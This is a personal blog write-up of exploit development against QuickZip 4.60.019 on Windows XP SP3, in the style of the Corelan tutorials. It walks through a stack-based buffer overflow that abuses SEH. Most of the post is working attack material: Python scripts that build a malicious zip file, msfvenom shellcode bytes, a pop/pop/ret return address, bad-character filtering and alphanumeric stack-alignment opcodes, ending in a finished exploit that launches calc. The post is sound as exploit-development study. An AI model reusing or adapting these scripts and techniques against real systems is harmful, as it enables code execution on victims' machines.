---
layout: post
title: Corelan's QuickZip write-up
date: 2019-08-13 13:57 +0100
category: Exploit Development
permalink: /blog/quickzip-corelan
---

This is my first write-up dealing with binary exploitation, covering a BOF SEH-based vulnerability that is about a decade old.

> If SEH based exploits are new to you, read this [blogpost](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/) then come back :)

## Introduction
I'm into Windows Exploit Development, and since you are reading this article, I presume you are as well. I mean, come on, isn't it the most challenging, self-rewarding branch of cybersecurity, where you get to burn what's left of your grey matter, attempting to turn a crash in a software, into arbitrary code execution.

So I was going through [Corelan][corelanTuts]'s exploit development tutorials (which, by the way, is one of the few excellent resources on this topic), and stumbled upon his writeup (found [here](https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/)) about a 0-day vulnerability he discovered and the working exploit he made. When you read the first paragraphs, you'll have noticeed that he keeps challenging you to figure out the next step by yourself. So I made up my mind : why not try to exploit it myself, then come back later and finish reading. That's what I did, and I ended up doing it entirely differently.

In this blogpost, i'm going to narrate how I exploited a stack based buffer overflow through abusing the SEH mechanism on a Windows XP SP3 (English) box. So, read on.

## Box Setup
The era is 2010, Win xp days, no ASLR yet, you can still find some non-SafeSEH OS dlls around, and DEP is set to Opt-In by default.

* The OS version I use is Windows XP SP3 32bit (English), you can get it from [getintopc](https://getintopc.com/softwares/operating-systems/windows-xp-professional-sp3-32-bit-iso-dec-2016-download-8012510/) (This copy could be trojanized, we'll just deny internet access once setup is complete). I installed it on VirtualBox in my Ubuntu machine.

* Go ahead and download [Immunity Debugger](https://www.immunityinc.com/products/debugger/). Also, get [mona](https://github.com/corelan/mona) plugin, download the .py file, and put it under **PyCommands** folder under ImmunityDebugger installation path.

* A copy of the vulnerable software, [QuickZip 4.60.019](https://www.exploit-db.com/apps/06c1cb6633edd4688cc00864a7079935-quickzip_4-60-019.exe), and install it.

We're all set.

## The vulnerability
This particular version of QuickZip is vulnerable to a stack-based buffer overrun when is fed a specially crafted zip file. The below python code builds `corelanboom.zip` file that is susceptible to crash the program.

```python
import struct

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00" + \
             "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14" + \
             "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00\x00\x00\x00\x01\x00" + \
             "\x24\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" + \
                    "\x12\x10\x00\x00" + \
                    "\x02\x10\x00\x00" + \
                    "\x00\x00"

payload = "A"*4064
payload += ".txt"

print "Size : %d" % len(payload)

with open('./corelanboom.zip', 'wb') as f:
    f.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
```

Copy the .zip file to the WinXP box and open it with QuickZip.

![zipboom_open]({{ "/img/zip_open.png" }})

The content of the `payload` variable becomes the name of a compressed file, when double clicked to open, crashes the application.

## From Crash to Exploit
Let's fire up ImmunityDebugger (ImmDbg from now on) and carefully study the crash. Once inside, Press **F3** and choose to run QuickZip, then **F9** to continue execution. Choose to open our malformed .zip file, and double click again the `"AAAA..."` file inside. The First chance exception kicks in ImmDbg, giving you a chance to analyze it before it is handed over to the application's stack-frame exception handler.

![AV]({{ "/img/AV.png" }})

> Sometimes you hit a user-defined exception (thrown with ntdll!RtlRaiseException) like the one shown below. In this case, all you have to do is a **Shift + F9** to pass it to the program for handling, then you'll hit the above AccessViolation exception.
> ![user_excpet]({{ "/img/user_except.png" }})

The faulty instruction points at (**EDI = 0x130000**)

![faulty_instr]({{ "/img/faulty_instr.png" }})

Press **Alt + S** to show the SEH chain of the current thread; one look at it and we see that the second entry has been corrupted with our A's.

![seh_corrupt]({{ "/img/seh_corrupt.png" }})

![seh_corrupt]({{ "/img/seh_corrupt2.png" }})

So we have to deal wit an SEH-based exploit. Now go to the stack view (the pane on the bottom-right), and select the address at *SE handler*, then scroll down to the bottom of the stack, where there are no more `A's`. Right-click on the last one, then from the drop-down menu, go to **Adress->relative to selection**. This says, that we have a space of `0x3F8 = 1016` bytes to house our shellcode after the SEH record.

Sweet!!! Couldn't get any easier than that. Let's quickly craft a working exploit.

First, the offset to the SEH record. In ImmDbg's Python shell at the bottom, type `!mona pattern_create 3000`, then open `C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt` to retrieve the generated Metasploit Cyclic Pattern (variable *msf* in script)

![msf_3000]( {{ "/img/msp.png" }})

Replace **payload** content with : `payload = msf + "A"*(4064 - len(msf))`
Go ahead and generate the .zip file, load it in QuickZip while attached to ImmDbg (or you can press **Ctrl + F2** to restart the debugged program), after that, you trigger the 1st chance exception. Once there, **Alt + S** for SEH chain window to appear, and then, on the corrupt SEH entry, right-click to *Follow address in stack*.

![seh_msf]({{ "/img/seh_msf.png" }})

![seh_msf2]({{ "/img/seh_msf2.png" }})

Use the 4 alphanumeric bytes next to *Pointer to next SEH record* in conjuction with *!mona* PyCommand to get the desired offset : `!mona pattern_offset Aj9A` (the result is on the *Log* view, **Alt+l**). I need to prepend the payload with **297 bytes** before *next SEH* is reached.

Second, address of a **pop/pop/ret** sequence in a non-safeseh module. `!mona seh` will take care of that. the output file *seh.txt* can be found in ImmDbg installation directory. Only **QuickZip.exe** is non-safeseh built from the application's modules, grab an address from here if you need a multi OS version exploit, although you'll have to deal with a null-byte. I choose `0x6d7e467b` from **D3DXOF.dll**, which is a system dll.

I went ahead and generated a calculator shellcode, `msfvenom -p windows/exec cmd=calc.exe -a x86 --platform windows -f python -b '\x0a\x0d\x00'`, with the usual three suspects excluded. Also, I added a jump code that will be put in *next SEH* entry.

```python
import struct

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00" + \
             "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14" + \
             "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00\x00\x00\x00\x01\x00" + \
             "\x24\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" + \
                    "\x12\x10\x00\x00" + \
                    "\x02\x10\x00\x00" + \
                    "\x00\x00"

#
# bad cars : \x00\x0a\x0d
# windows/exec cmd=calc.exe x86
# Size = 220
shellcode =  ""
shellcode += "\xda\xd0\xd9\x74\x24\xf4\xb8\x9d\xd1\x5c\x93\x5e\x31"
shellcode += "\xc9\xb1\x31\x31\x46\x18\x83\xee\xfc\x03\x46\x89\x33"
shellcode += "\xa9\x6f\x59\x31\x52\x90\x99\x56\xda\x75\xa8\x56\xb8"
shellcode += "\xfe\x9a\x66\xca\x53\x16\x0c\x9e\x47\xad\x60\x37\x67"
shellcode += "\x06\xce\x61\x46\x97\x63\x51\xc9\x1b\x7e\x86\x29\x22"
shellcode += "\xb1\xdb\x28\x63\xac\x16\x78\x3c\xba\x85\x6d\x49\xf6"
shellcode += "\x15\x05\x01\x16\x1e\xfa\xd1\x19\x0f\xad\x6a\x40\x8f"
shellcode += "\x4f\xbf\xf8\x86\x57\xdc\xc5\x51\xe3\x16\xb1\x63\x25"
shellcode += "\x67\x3a\xcf\x08\x48\xc9\x11\x4c\x6e\x32\x64\xa4\x8d"
shellcode += "\xcf\x7f\x73\xec\x0b\xf5\x60\x56\xdf\xad\x4c\x67\x0c"
shellcode += "\x2b\x06\x6b\xf9\x3f\x40\x6f\xfc\xec\xfa\x8b\x75\x13"
shellcode += "\x2d\x1a\xcd\x30\xe9\x47\x95\x59\xa8\x2d\x78\x65\xaa"
shellcode += "\x8e\x25\xc3\xa0\x22\x31\x7e\xeb\x28\xc4\x0c\x91\x1e"
shellcode += "\xc6\x0e\x9a\x0e\xaf\x3f\x11\xc1\xa8\xbf\xf0\xa6\x47"
shellcode += "\x8a\x59\x8e\xcf\x53\x08\x93\x8d\x63\xe6\xd7\xab\xe7"
shellcode += "\x03\xa7\x4f\xf7\x61\xa2\x14\xbf\x9a\xde\x05\x2a\x9d"
shellcode += "\x4d\x25\x7f\xfe\x10\xb5\xe3\x2f\xb7\x3d\x81\x2f"

jmpcode = "\xeb\x06\xff\xff"
ret = struct.pack('<L', 0x6d7e467b) # p/p/r from d3dxof.dll
pre_payload = "A"*297 + jmpcode + ret + shellcode
payload = pre_payload + "B"*(4064-len(pre_payload)) + ".txt"

print "Size : %d" % len(payload)

with open('./corelanboom.zip', 'wb') as f:
    f.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
```

This should work just fine. Now, go ahead and try pop your beloved calculator. Oops!! Nothing happens, even inside the debugger, QuickZip just hangs. Now there could be a thousand explanation for this, but I'm betting that this has to do with *BAD CHARACTERS*. Remember how the payload was interpreted!!! it's a filename, so, filenaming constraints apply here. To avoid any further unnessceray trial and error, we'll make sure, from now on, our payload only contains valid windows filename characters.

```
Valid Windows Filename Characters are all printable ascii except :

 " (double quote) : 0x22
 * (asterisk) : 0x2a
 / (forward slash) : 0x2f
 : (colon - sometimes works, but is actually NTFS Alternate Data Streams) : 0x3A
 < (less than) : 0x3c
 > (greater than) : 0x3e
 ? (question mark) : 0x3f
 \ (backslash) : 0x5c
 | (vertical bar or pipe) : 0x7b
```

Let's start with our *ppr* address, `0x6d7e467b`. Hmmm, we got lucky here, all of its bytes are valid characters. Easy win ;)

Next, the jump code, `\xeb\x06\xff\xff`, the **0xff**s are just placeholders, will be replaced with **0x41**s. **jmp = 0xeb** instruction is not the only jump variant, we have among others, **JE = 0x74** and **JNE = 0x75**. We have to check the ZF (Zero Flag) status when execution reaches our jump code. Replace it with "XXXX" and remove the shellcode.

```python
...
#jmpcode = "\xeb\x06\xff\xff"
jmpcode = "XXXX"
ret = struct.pack('<L', 0x6d7e467b) # p/p/r from d3dxof.dll
pre_payload = "A"*297 + jmpcode + ret# + shellcode
payload = pre_payload + "B"*(4064-len(pre_payload)) + ".txt"
...
```
Before triggering the exception, set a breakpoint at your chosen *ppr* address. Execution had reached our ppr, hit **F7** three times (to single step through the ppr), and EIP will point to the jumpcode.

![eip_jmpcode]({{ "/img/eip_jmpcode.png" }})

![zf]({{ "/img/zf.png" }})

The zero flag is **set**, we'll be using **JE** then. Now, the jump offset. *0x06* isn't a valid character; In fact, we can't use a value that is lesser than *0x20*. Let's do the math : We already have the 2 **0x41** bytes + 4 bytes of the SE Handler, so `0x20 - 2 - 4 = 26` (we can add nops, such as `inc edx = 0x42`, for extra flexibility).

```python
...
jmpcode = "\x74\x20\x41\x41"
ret = struct.pack('<L', 0x6d7e467b) # p/p/r from d3dxof.dll
pre_payload = "A"*297 + jmpcode + ret + "B"*26# + shellcode
payload = pre_payload + "B"*(4064-len(pre_payload)) + ".txt"
...
```

Now, for the shellcode, we'll be using some msfvenom's alpha encoder. They don't generate a fully alphanumeric binary, the first few instructions are not, because they are needed to localize the shellcode decoder in memory. However, if you manage to have a register pointing at the decoder the moment it is called, there is that `BufferRegister=reg32` parameter that can be passed to msfvenom. Now the encoder knows the given register holds its absolute address, and it will only generate alphanumeric shellcode. Let's use **ECX**.

```bash
msfvenom -p windows/exec cmd=calc.exe -a x86 --platform windows -f python -e x86/alpha_mixed -b '\x22\x2a\x2f\x3c\x3e\x3f\x5c\x7b\x00' BufferRegister=ECX
```

Replace the calc shellcode with this one. Let's see how to put the shellcode address in ECX using only ASCII friendly instructions. After the `JE 0x20`, the following snippet of code will be executed, making ECX holds the required value.

```nasm
ndisasm -pintel -u align.bin
00000000  59                pop ecx
00000001  59                pop ecx
00000002  59                pop ecx
00000003  5C                pop esp
00000004  61                popa
00000005  61                popa
00000006  61                popa
00000007  54                push esp
00000008  59                pop ecx
00000009  7433              jz 0x3e
```

##### What does this code do ?
When execution is transfered to an exception handler, the ntdll's exception dispatcher has already set up the stack frame in a certain way, pushing some necessary arguments for the call. Here is what it looks like when the *jmpcode* jump is made :

![eh_stack]({{ "/img/se_stack.png" }})

The first four instructions will make **ESP** points at our controlled SEH record (where the jumpcode is). *0x20* bytes from there, resides the *stack align* code (the one above). To avoid any unwanted situation where *EIP* and *ESP* overlap, the three **POPAD** instructios are there to push ESP far away, and that is where we will put our encoded shellcode. The next `push esp; pop ecx` makes ECX points at it. Then a jump is made there (JZ or JNZ, you just have to check the ZF status). Let's single step through it to see how I did come up with the last jump offset **0x33**.

```python
...
alpha_align_stack = "\x59\x59\x59" \
                    "\x5c" \
                    "\x61\x61\x61" \
                    "\x54" \
                    "\x59" \
                    "\x74\x33"

jmpcode = "\x74\x20\x41\x41"
ret = struct.pack('<L', 0x6d7e467b) # p/p/r from d3dxof.dll
pre_payload = "A"*297 + jmpcode + ret + "B"*26 + alpha_align_stack# + shellcode
payload = pre_payload + "C"*(4064-len(pre_payload)) + ".txt"
...
```

![je_diff]({{ "/img/je_diff.png" }})

EIP currently points at *je 0x33* instruction, so we need to put a junk of `0x5c - 0x27 = 0x33` bytes between the align stack code and the shellcode decoder. Download the final exploit [here](/blob/quickzip_pwn.py).

Go ahead and generate the zip file. Load it in QuickZip and see it crash but not before our precious calc.exe is spawned. **Pwned!!**

> 'pop esp' is the opcode 0x54, or, the backslash '\\', that's why you see the extra folder within the zip.

## Final thoughts
???


[corelanTuts]: https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/
